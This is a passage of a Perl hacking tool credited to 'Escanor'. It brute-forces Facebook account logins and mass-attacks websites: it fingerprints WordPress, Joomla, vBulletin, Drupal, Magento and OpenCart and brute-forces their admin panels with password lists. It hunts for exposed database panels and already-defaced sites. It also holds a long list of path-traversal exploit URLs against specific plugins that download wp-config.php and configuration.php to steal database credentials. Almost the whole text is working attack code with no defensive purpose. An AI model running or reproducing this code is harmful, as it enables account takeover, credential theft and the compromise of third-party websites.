print color('bold yellow'),"Enter List..";
print color('bold green'),"] ";
$otlebb=<>;
open (PASSFILE, "<$otlebb") || die "[-] Please Check ur File !";
@PASSS = <PASSFILE>;
print color('bold green'),"  [";
print color('bold yellow'),"+";
print color('bold green'),"] ";
print color('bold green'),"otlebb ... Founded \n";
close PASSFILE;
foreach $password (@PASSS) {
chomp $password;
		$facebook = LWP::UserAgent->new();
		$facebook->default_header('Authorization' => "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16");
		$response = $facebook->post('https://b-api.facebook.com/method/auth.login',{format => 'json',email => $password,password => $password,credentials_type => 'password'});
		if ($response->content=~ /"session_key"/) {
			print color('bold blue'),"--> Founded Ya Escan0r : $password:$password\n";
			open(mark,">>xrzlts/Fbrzlts.txt");
			print mark "-----		 Boom!!		 -----\n$password:$password\n-----Fucked By Escanor-----\n";close(mark);sleep(3);}else {if ($response->content=~ /Invalid username or password/) {print color('bold red'),"Failed : $password:$password\n";}else{if ($response->content=~ /Invalid username or email address/) {print color('bold yellow'),"NotFound : $password \n";}else{print color('bold red'),"Error !!\n";}}}}}
sub fbsmash(){ 
system ("title Hello Walkers ");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),q(
                ..:::::::::..
           ..:::aad8888888baa:::..
        .::::d:?88888888888?::8b::::.
      .:::d8888:?88888888??a888888b:::.
    .:::d8888888a8888888aa8888888888b:::.
   ::::dP::::::::88888888888::::::::Yb::::
  ::::dP:::::::::Y888888888P:::::::::Yb::::
 ::::d8:::::::::::Y8888888P:::::::::::8b::::
.::::88::::::::::::Y88888P::::::::::::88::::.
:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
:::::::Y88888888888P::|::Y88888888888P:::::::
::::::::::::::::888:::|:::888::::::::::::::::
`:::::::::::::::8888888888888b::::::::::::::'
 :::::::::::::::88888888888888::::::::::::::
  :::::::::::::d88888888888888:::::::::::::
   ::::::::::::88::88::88:::88::::::::::::
    `::::::::::88::88::88:::88::::::::::'
      `::::::::88::88::P::::88::::::::'
        `::::::88::88:::::::88::::::'
           ``:::::::::::::::::::''
                ``:::::::::''  
  #Facebook Bruter
 # xkyuby - AronTn && Escan0r);          
print color 'bold blue';
open (USERFILE, "<user.txt") || die "[-] Please Try To Save user.txt(Profil's ID) !";
@USERS = <USERFILE>;
print color('bold green'),"\n  [";
print color('bold yellow'),"+";
print color('bold green'),"] ";
print color('bold green'),"User.txt ... Founded \n";
close USERFILE;
print color 'bold blue';
open (PASSFILE, "<passwd.txt") || die "[-] Please Try To save passwd.txt(passwords's List) !";
@PASSS = <PASSFILE>;
print color('bold green'),"  [";
print color('bold yellow'),"+";
print color('bold green'),"] ";
print color('bold green'),"passwd.txt ... Founded \n";
close PASSFILE;
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		$facebook = LWP::UserAgent->new();
		$facebook->default_header('Authorization' => "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16");
		$response = $facebook->post('https://b-api.facebook.com/method/auth.login',{ format => 'json',email => $username,password => $password,credentials_type => 'password'});if ($response->content=~ /"session_key"/) {
			print c
      olor('bold blue'),"--> Founded Ya Escan0r : $username:$password\n";
			open(mark,">>boom.txt");
			print mark "-----	Boom!!	-----\n$username:$password\n-----Fucked By Escan0r-----\n";
			close(mark);exit();sleep(3);}else {if ($response->content=~ /Invalid username or password/) {print color('bold red'),"Failed : $username:$password\n";}else{if ($response->content=~ /Invalid username or email address/) {print color('bold yellow'),"NotFound : $username \n";}else{print color('bold red'),"Wtf !!\n";}}}}}}

sub storm(){ 
print color('bold green'); 
print q(  
                ..:::::::::..
           ..:::aad8888888baa:::..
        .::::d:?88888888888?::8b::::.
      .:::d8888:?88888888??a888888b:::.
    .:::d8888888a8888888aa8888888888b:::.
   ::::dP::::::::88888888888::::::::Yb::::
  ::::dP:::::::::Y888888888P:::::::::Yb::::
 ::::d8:::::::::::Y8888888P:::::::::::8b::::
.::::88::::::::::::Y88888P::::::::::::88::::.
:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
:::::::Y88888888888P::|::Y88888888888P:::::::
::::::::::::::::888:::|:::888::::::::::::::::
`:::::::::::::::8888888888888b::::::::::::::'
 :::::::::::::::88888888888888::::::::::::::
  :::::::::::::d88888888888888:::::::::::::
   ::::::::::::88::88::88:::88::::::::::::
    `::::::::::88::88::88:::88::::::::::'
      `::::::::88::88::P::::88::::::::'
        `::::::88::88:::::::88::::::'
           ``:::::::::::::::::::''
                ``:::::::::''  
              ~~Escanor Sama~~);
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Websites : ";
print color('bold yellow');
$list=<STDIN>;
open(tarrget,"<$list") or die "Winha wbsitelist Ya 7ej -_-\n";
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Threads : ";
print color('bold yellow');
$thr=<STDIN>;
push(@threads, threads->create (\&shadow, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
eval {
$_->join foreach @threads;
@threads = ();}
}

sub shadow(){ 
Mayar:while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; }
$usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->agent("Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0");
$usrag->timeout (15);
$magsite = $site . '/admin';
my $magcms = $usrag->get("$magsite")->content;
my $yfz = $site . "fckeditor/editor/filemanager/connectors/php/upload.php";
my $nanii = $usrag->get("$site")->content;
if($nanii =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
wpbrute();
}elsif($nanii =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
joomlabrute();
}elsif($nanii =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/) {
vBullbr();
}elsif($nanii =~/Drupal|drupal|sites\/all|drupal.org/) {
Drupal();
}elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
magento();
}elsif($nanii =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
opencart();
# its okk To rehack Those Sites ;) 
}elsif($nanii =~/Hacked by|defaced|anonymous|Mister Spy|HaCKeD/) { #zidha Jaabdinja3bassa :v
print color('bold yellow')," [";
print color('bold green'),"Hacked";
print color('bold green'),">";
print color('bold yellow'),"] ";
print color('bold red'),"$site\n";
open (TEXT, '>>logz/hacked_sites.txt');
print TEXT "$site\n";
close (TEXT);next Mayar;
}elsif($nanii =~/Index Of/) {
print color('bold yellow')," [";
print color('bold green'),"Index OF";
print color('bold green'),">";
print color('bold yellow'),"] ";
print color('bold red'),"$site\n";
open (TEXT, '>>logz/indexof.txt');
print TEXT "$site\n";
close (TEXT);
next Mayar;
}elsif($yfk =~/OnUploadCompleted/) {
print color('bold yellow')," [";
print color('bold green'),"FckEditor";
print color('bold green'),">";
print color('bold yellow'),"] ";
print color('bold red'),"$site\n";
open (TEXT, '>>logz/fkedit0r.txt');
print TEXT "$site\n";
close (TEXT);next Mayar;
}elsif($yfk =~/hacker|dork|security|anon|card|blogspot./) {#We All had this Shit with * or in * 
print color('bold yellow')," [";
print color('bold green'),"HackerzBlogger";
print color('bold green'),">";
print color('bold yellow'),"] ";
print color('bold red'),"$site\n";
open (TEXT, '>>logz/HackerzForums.txt');
print TEXT "$site\n";
close (TEXT);next Mayar;
}else{
#direction ~~> ADmin Panel Finder
print color('bold blue')," [";
print color('bold green'),"Other";
print color('bold green'),">Searching The Panel";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
print color('reset');
actionha();
}}
}
################ vBulletin ################
sub vBullbr{
$magsite = $site . '/admincp/';
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$magsite\n";
close (TEXT);
$usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$usrag->timeout (30);
$usrag->cookie_jar(HTTP::Cookies->new(file => 'mycookies.txt',autosave => 1));
$getoken = $usrag->get("$site")->content;
if ( $getoken =~ /type="hidden" name="url" value="(.*)"/ ) {
$urll = $1 ;
}else{$urll="/admincp/";}
if ( $getoken =~ /type="hidden" name="s" value="(.*)"/ ) {
$token = $1 ;
}else{$token="";}
if ( $getoken =~ /type="hidden" name="logintype" value="(.*)"/ ) {
$loginn = $1 ;
}else{$loginn="login";}
foreach $user(@adminnzz){
chomp ($user);
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$vbuser = $user;
$vbpass = $passmwd;
print color('bold blue')," [";
print color('bold green'),"vBulletin";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
print color('bold blue'),"\t[";
print color('bold red'),"$vbuser";
print color('bold blue'),"] \n";
print color('bold blue'),"\t[";
print color('bold red'),"$vbpass";
print color('bold blue'),"] \n";
$magbrute = POST $site, ["url" => "$urll", "s" => "$token", "logintype" => "$loginn", "do" => "login", "vb_login_md5password" => "", "vb_login_md5password_utf" => "", "vb_login_username" => "$vbuser", "vb_login_password" => "$vbpass"];
$response = $usrag->request($magbrute);
my $pwnd = $usrag->get("$site/../login.php?do=login")->content;
if ($pwnd =~ /exec_refresh/){
print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $vbuser Pass: $vbpass";
print color('bold blue'),"] \n";
open (TEXT, '>>Logz/vbulletin.txt');
print TEXT "($magsite)=escanor=(User: $vbuser Pass: $vbpass)\n";
close (TEXT);
next Mayar;
}}
}
}
################ Magento ################
sub magento{
$magsite = $site . '/admin';
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$magsite\n";
close (TEXT);
$usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$usrag->timeout (30);
$usrag->cookie_jar(HTTP::Cookies->new(file => 'mycookies.txt',autosave => 1));
$getoken = $usrag->get("$site/admin")->content;
if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
$token = $1 ;
}else{print color('bold red')," Opss ! Next Plz ...\n";next Mayar;}
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$maguser = "admin";
$magpass = $passmwd;
print color('bold blue')," [";
print color('bold green'),"Magento";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
print color('bold blue'),"\t[";
print color('bold red'),"$magpass";
print color('bold blue'),"] \n";

$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
$response = $usrag->request($magbrute);
my $pwnd = $usrag->get("$magsite")->content;
if ($pwnd =~ /logout/){
print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $maguser Pass: $magpass";
print color('bold blue'),"] \n";
open (TEXT, '>>Logz/magentopass.txt');
print TEXT "($magsite)=escanor=(User: $maguser Pass: $magpass)\n";
close (TEXT);
next Mayar;
}
}
################ Opencart ################
sub opencart{
print color('bold blue')," [";
print color('bold green'),"Opencart>";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
print color('bold blue'),"\t[";
print color('bold red'),"$ocpass";
print color('bold blue'),"] \n";
$OpenCart= $site . '/admin/index.php';
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$OpenCart\n";
close (TEXT);
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$ocuser = 'admin';
$ocpass = $passmwd;
$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $usrag->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $ocuser Pass: $ocpass";
print color('bold blue'),"] \n";
open (TEXT, '>>Logz/opencart.txt');
print TEXT "($OpenCart)=escanor=(User: $ocuser Pass: $ocpass)\n";
close (TEXT);
next Mayar;
}
}
}

################ Drupal ################
sub Drupal{
print color('bold blue')," [";
print color('bold green'),"Drupal>";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
print color('bold blue'),"\t[";
print color('bold red'),"$drupass";
print color('bold blue'),"] \n";
$drupal = $site . '/user/login';
$redirect = $site . '/user/1';
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$drupal\n";
close (TEXT);
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$druser = 'admin';
$drupass = $passmwd;
$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
$response = $usrag->request($drupalbrute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $druser Pass: $drupass";
print color('bold blue'),"] \n";
open (TEXT, '>>Logz/drup.txt');
print TEXT "($drupal)=escanor=(User: $druser Pass: $drupass)\n";
close (TEXT);
next Mayar;
}
}
}
################ wordpress ################
sub wpbrute{
print color('bold blue')," [";
print color('bold green'),"WordPress>";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$site/wp-login.php\n";
close (TEXT);
$getversion = $usrag->get($site)->content;
if($getversion =~/content="WordPress (.*?)"/) {
print color('bold red'),"[";
print color('bold green'),"/>";
print color('bold red'),"] ";
print color('bold white'),"Version : $1";
}
$user = $site . '/?author=1';
$getuser = $usrag->get($user)->content;
if($getuser =~/author\/(.*?)\//){
$wpuser=$1;
print color('bold red'),"[";
print color('bold green'),"/>";
print color('bold red'),"] ";
print color('bold white'),"user : $wpuser\n";
ouui();
}
else {
print color('bold red'),"[";
print color('bold green'),">";
print color('bold red'),"] ";
print color('bold white'),"user : Admin\n";
noo();
}
}
sub ouui{
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$wpz = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpass = $passmwd;
print color('bold blue'),"\t[";
print color('bold red'),"$wpass";
print color('bold blue'),"] \n";

$wpbrute = POST $wpz, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $usrag->request($wpbrute);
my $stat = $response->as_string;

if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){
print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $wpuser Pass: $wpass";
print color('bold blue'),"] \n";
open (TEXT, '>>Logz/wordpress.txt');
print TEXT "($wpz)=escanor=(User: $wpuser Pass: $wpass)\n";
close (TEXT);
print color('reset');
next Mayar;
}
}
}
}
sub noo{
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$wpzz = $site . '/wp-login.php';
$redirect = $site . '/wp-admin/';
$wpuser = "admin";
$wpass = $passmwd;
print color('bold blue'),"\t[";
print color('bold red'),"$wpass";
print color('bold blue'),"] \n";
$wpbrute = POST $wpzz, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
$response = $usrag->request($wpbrute);
my $stat = $response->as_string;
if($stat =~ /Location:/){
if($stat =~ /wordpress_logged_in/){
print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $wpuser Pass: $wpass";
print color('bold blue'),"] \n";
open (TEXT, '>>Logz/wordpress.txt');
print TEXT "($wpz)=escanor=(User: $wpuser Pass: $wpass)\n";
close (TEXT);
print color('reset');
next Mayar;
}
}
}
}
################ joomla ################

sub joomlabrute{
my $url = "$site/language/en-GB/en-GB.xml";
my $checkomusersc = $usrag->get("$url")->content;
print color('bold blue')," [";
print color('bold green'),"Joomla>";
print color('bold blue'),"] ";
print color('bold yellow'),"$site\n";
if($checkomusersc =~/<version>(.*)</) {
print color('bold red'),"[";
print color('bold green'),"/>";
print color('bold red'),"] ";
print color('bold white'),"Version : $1";
}
$joomsite = $site . '/administrator/index.php';
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$joomsite\n";
close (TEXT);
$usrag->timeout (30);
$usrag->cookie_jar(HTTP::Cookies->new(file => 'mycookies.txt',autosave => 1));
$getoken = $usrag->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
	print color('bold red')," Opss ! Next Plz ...\n";
	next Mayar;
}
foreach $passmwd(@passwdzz){
chomp ($passmwd);
$joomuser = 'admin';
$joompass = $passmwd;
print color('bold blue'),"\t[";
print color('bold red'),"$joompass";
print color('bold blue'),"] \n";
$joomlabrute = post $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $usrag->request($joomlabrute);

my $check = $usrag->get("$joomsite")->content;
if ($check =~ /logout/){
	print color('bold blue'),"[";
print color('bold green'),"Found !!> ";
print color('bold red'),"User: $joomuser Pass: $joompass";
print color('bold blue'),"] \n";
open (TEXT, '>>logz/Joom.txt');
print TEXT "($joomsite)=escanor=(User: $joomuser Pass: $joompass)\n";
close (TEXT);}
next Mayar;
}
}
################ Autre ################
sub actionha(){
foreach $yooo(@admpath){
chomp ($yooo);
$boom="$site/$yooo";
my $usrag = $usrag->get("$boom")->status_line;
if($usrag =~/200|302/) {
print color('bold green'),"  Oh ! >";
print color('bold blue'),"$boom\n";
open (TEXT, '>>logz/Panelz.txt');
print TEXT "$boom\n";
close (TEXT);
}}
}
}
###########
# Lkochmar Never Die <3  
sub Psycom(){
@pwned=('/phpMyAdmin/','/phpmyadmin/','/adminer.php','/PMA/','/admin/','/mysql/','/dbadmin/','/p/m/a/','/myadmin/','/phpMyAdmin-2/','/PMA2005/','/phpmanager/','/sqlmanager/','/php-my-admin/','/sqlweb/','/mysqladmin/','/php-myadmin/','/phpmy-admin/','/pma2005/','/websql/','/webadmin/','/webdb/');
print color('reset'),"[Config2Panel]";
print color('bold yellow')," Wait\n";print color('bold red')," ...\n";
$ttt = $usrag->get("$site"); 
if ($ttt->status_line =~/200/){
my $usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->timeout (15);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$idd = $usrag->request(HTTP::Request->new(GET => $site))->content;
if ($idd=~/DB_NAME|JConfig|db_pwd|config|db_password|DB_USER|user=/){
print color('bold red'),"\n[";
print color('bold green'),"Config!";
print color('bold red'),"]";
print color('bold yellow')," $site\n";
@suphttp=split/http:\/\//,$site ;
$site = @suphttp[1];
@doo = split/\//,$site ;
$site = @doo[0];
foreach $pwn(@pwned){
  chomp ($pwn);
my $usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->timeout (15);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$zzz = $usrag->get("http://$site$pwn")->content;
if ($zzz =~/Welcome to phpMyAdmin|Username|Password/){
print color('bold red'),"\n[";
print color('bold green'),"Found!";
print color('bold red'),"]";
print color('bold yellow')," $site/$pwn\n";	
}
}
}
}
$zeeeeby=<>;
}
###########
sub mirroh(){
print color('bold green'); 
print q(                                                                                    
       _         ___         _____ 
 _____|_|___ ___|   |___ ___|  |  |
|     | |  _|  _| | |  _|___|     |
|_|_|_|_|_| |_| |___|_|     |__|__|
);                                   
print color('bold red'),"\n[";
print color('bold green'),"Defacer ID";
print color('bold red'),"]";
$id=<>;
print color('bold red'),"\n[";
print color('bold green'),"PHPSESSID";
print color('bold red'),"]";
$phpsessid=<>;
$page=1;$url="https://mirror-h.org/search/hacker/$id/pages/$page";
my $you=$usrag->post($url,[cookie=>[PHPSESSID=>$phpsessid]])->content;
if ($you=~/<a href="https:\/\/mirror-h.org\/search\/hacker\/$id\/">(.*)<\/a><\/td>/){
$defaname=$1;
print color('bold red'),"\n[";
print color('bold green'),"Defacer Name";
print color('bold red'),"]"; 
print color('bold yellow'),"$defaname";
while ($page<50){
my $url="https://mirror-h.org/search/hacker/$id/pages/$page";
if ($you=~/<a href="https:\/\/mirror-h.org\/zone\/(.*)\/">(.*)<\/a><\/td>/) { 
print color('bold red'),"\n[";
print color('bold green'),"+";
print color('bold red'),"]"; 
print color('bold yellow'),"$2";
open (lay,">>logz/$defaname_mirror.txt");
print lay "$2\n";
close lay;}
$page+=1;}
}else{print color('bold red '),"Something Wroung !!";}
$zeeeeby=<>;
}
# Nice Joke by me haan xD Good Luck 4u anyway
sub hackedcnf(){
#Configs's Dirs
@cnfgs=('tmp/configs','idx_config','xBlack_Configs','test/M-Iraq','bt','BT','tmp','temp','configs');
foreach $cnf(@cnfgs){
  chomp ($cnf);
$zzz=$usrag->get("$site/$cnf")->content;
if ($zzz=~/index of|configs|grab|by|whm/){
print color('bold red'),"[";
print color('bold green'),"Check It !";
print color('bold red'),"] ";print color('bold yellow'),"$site/$cnf";
}
}
}
###########
#1st tab
sub cnfgrr(){
print color('bold green'); 
print q(
    .o88b. d8b   db d88888b      d88888b d888888b d8b   db d8888b. d88888b d8888b. 
   d8P  Y8 888o  88 88'          88'       `88'   888o  88 88  `8D 88'     88  `8D 
   8P      88V8o 88 88ooo        88ooo      88    88V8o 88 88   88 88ooooo 88oobY' 
   8b      88 V8o88 88~~~        88~~~      88    88 V8o88 88   88 88~~~~~ 88`8b   
db Y8b  d8 88  V888 88           88        .88.   88  V888 88  .8D 88.     88 `88. 
VP  `Y88P' VP   V8P YP           YP      Y888888P VP   V8P Y8888D' Y88888P 88   YD 
                                 ~~Escanor Sama~~);
@chb3acnf=('manage/configuration.php', 'members/configuration.php', 'new/wp-config.php', 'bill/configuration.php', 'host/includes/iso4217.php', 'includes/configure.php', 'article/config.php', 'hostbill/includes/iso4217.php', 'supp/configuration.php', 'protal/configuration.php', 'zencart/includes/dist-configure.php', 'whm/whmcs/configuration.php', 'oscom/includes/configure.php', 'billing/configuration.php', 'cms/configuration.php', 'blog/wp-config.php', 'shopping/includes/configure.php', 'home3/wp-config.php', 'clientsupport/configuration.php', 'wordpress/beta/wp-config.php', 'billings/includes/iso4217.php', 'forum/Settings.php'
, 'forums/Settings.php', 'support/includes/iso4217.php', 'news/configuration.php', 'sites/default/settings.php', 'clientarea/configuration.php', 'client/configuration.php', 'includes/iso4217.php', 'payment/configuration.php', 'shop/includes/dist-configure.php', 'wp-config.php', 'auto/configuration.php', 'news/wp-config.php', 'pay/configuration.php', 'config.inc.php', 'main/wp-config.php', 'hosts/includes/iso4217.php', 'forum/includes/class_core.php', 'wp/beta/wp-config.php', 'submitticket.php', 'hosting/configuration.php', 'Settings.php', 'main/configuration.php', 'wp/wp-config.php', 'protal/wp-config.php'
, 'myshop/configuration.php', 'hostbills/includes/iso4217.php', 'joomla/configuration.php', 'cc/includes/config.php', 'mk_conf.php', 'support/configuration.php', 'sale/configuration.php', 'joo/configuration.php', 'vb3/includes/config.php', 'oscommerces/includes/configure.php', 'cart/configuration.php', 'admin/conf.php', 'connect.php', 'WP/wp-config.php', 'include/db.php', 'site/configuration.php', 'hosts/configuration.php', 'includes/config.php', 'amember/config.inc.php', 'forum/includes/config.php', 'supports/configuration.php', 'os/includes/configure.php', 'home2/wp-config.php', 'cc/includes/class_core.php', 'vb/includes/config.php', 'upload/includes/config.php', 'purchase/configuration.php'
, 'buy/configuration.php', 'secure/configuration.php', 'smf/Settings.php', 'test/wp-config.php', 'oscommerce/includes/configure.php', 'hosting/includes/iso4217.php', 'client/includes/iso4217.php', 'panel/configuration.php', 'shop/configuration.php', 'secure/whm/configuration.php', 'billing/includes/iso4217.php', 'includes/dist-configure.php', 'wordpress/wp-config.php', 'home3/configuration.php', 'configuration.php', 'autobuy/configuration.php', 'host/configuration.php', 'up/includes/config.php', 'conf_global.php', 'clients/configuration.php', 'cliente/configuration.php', 'sale/includes/configure.php', 'Wordpress/wp-config.php', 'beta/wp-config.php', 'shop/includes/configure.php', 'whmc/WHM/configuration.php'
, 'new/configuration.php', 'shopping/configuration.php', 'vb/includes/class_core.php', 'blogs/wp-config.php', 'config.php', 'member/configuration.php', 'secure/whmcs/configuration.php', 'billings/configuration.php', 'supports/includes/iso4217.php', 'press/wp-config.php', 'my/configuration.php', 'arcade/functions/dbclass.php', 'checkout/configuration.php', 'site/wp-config.php', 'clientes/configuration.php', 'go/configuration.php', 'forums/includes/config.php', 'admin/config.php', 'hostings/includes/iso4217.php', 'whmcs/configuration.php'
,'/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php','/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=','/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php','/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1','/index.php?option=com_cckjseblod&task=download&file=configuration.php','/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php','/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0'
,'/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes','/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
,'/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php','/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php','configuration.php~','configuration.php_bak','/configuration.php-bak'
,'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php','/wp-e-commerce/wpsc-includes/misc.functions.php?image_name=../../wp-config.php','/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php','/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../../wp-config.php','/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php','/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00','/wp-content/themes/twentyeleven/download.php?file=%2Fwp-config.php','/wp-content/themes/twentyeleven/download.php?file=../../../wp-config.php'
,'/wp-content/themes/twentyeleven/download.php?filename=../../../../../wp-config.php','/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=troy5@seznam.cz&f=../../../../wp-config.php'
,'/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php','/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php','/wp-content/plugins//hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10','/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php','/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php','/wp-content/themes/liberator/inc/php/download.php?download_file=../wp-config.php','/wp-content/themes/kap/download.php?url=..%2Fwp-config.php'
,'/wp-content/themes/duena/download.php?f=../wp-config.php','/wp-content/themes/endlesshorizon/download.php?file=../../../wp-config.php','/wp-content/plugins/photocart-link/decode.php?id=Li4vLi4vLi4vd3AtY29uZmlnLnBocA=='
,'/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php','/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10','$site/wp-content/plugins/sf-booking/lib/downloads.php?file=$site/wp-config.php','/wp-content/plugins/sf-booking/lib/downloads.php?file=/wp-config.php','/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php','/wp-admin/admin-ajax.php?action=revolution-slider_show_image&img=../wp-config.php','/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php','/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php'
,'/wp-content/themes/estrutura-basica/scripts/download.php?arquivo=../../wp-config.php','/wp-content/plugins/contus-video-gallery/hdflvplayer/download.php?f=../../../../wp-config.php','/wp-config.php.bak','wp-config.php~','wp-config.php_bak','/wp-config.php-bak');
print color('bold blue'),"\n [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Websites : ";
print color('bold yellow');
$listtt=<>;
push(@threads, threads->create (\&hayhayahay));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
eval {
$_->join foreach @threads;
@threads = ();}
}
sub hayhayahay(){ 
open(taaar,"<$listtt") or die "Winha wbsitelist Ya 7ej -_-\n";
Sun:while(<taaar>){
chomp($_);$site=$_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site"; }
if($site =~/https/){
$site =~ s/https/http/ig;}
foreach $cnfa(@chb3acnf){
chomp ($cnfa);
my $usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->timeout (15);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$chkk=$usrag->get("$site/$cnfa");
if ($chkk->status_line=~/200/){
print $site;
if ($chkk->content=~/DB_NAME|JConfig|db_pwd|config|db_password|DB_USER|user=/){
print color('bold red'),"\n[";
print color('bold green'),"Found!";
print color('bold red'),"]"; 
print color('bold yellow')," $site/$cnfa\n"; 
open (lay,">>logz/Linkconfigs.txt") ;
print lay "[Link Config] $site/$cnfa"."\n";
close lay; 
next Sun;
}
}else{print color('bold green'),"\n[";
print color('bold red'),"No Found!";
print color('bold green'),"]"; 
print color('bold yellow')," $site/$cnfa\n"; }}
}
$zeeeeby=<>;
}
###########
sub shellomha(){
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),"\n\n";   
print q(
   _                 __ _          _ _   ___  ___ 
